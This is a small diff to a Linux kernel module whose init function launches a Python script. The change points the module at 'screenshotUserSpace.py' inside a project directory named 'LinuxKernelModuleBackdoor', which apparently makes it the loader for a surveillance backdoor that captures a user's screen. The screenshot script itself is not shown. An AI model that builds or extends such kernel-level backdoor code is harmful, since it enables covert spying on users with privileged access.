@@ -5,7 +5,7 @@
 
 static int __init execute_python_init(void)
 {
-    char *argv[] = { "/usr/bin/python", "/path/to/your/python/script.py", NULL };
+    char *argv[] = { "/usr/bin/python3", "/home/guscarenci/Documents/LinuxKernelModuleBackdoor/src/screenshotUserSpace.py", NULL };
     static char *envp[] = {
         "HOME=/",
         "TERM=linux",
@@ -31,5 +31,5 @@ module_init(execute_python_init);
 module_exit(execute_python_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
+MODULE_AUTHOR("Gustavo Moura");
 MODULE_DESCRIPTION("Kernel module to execute a Python script");
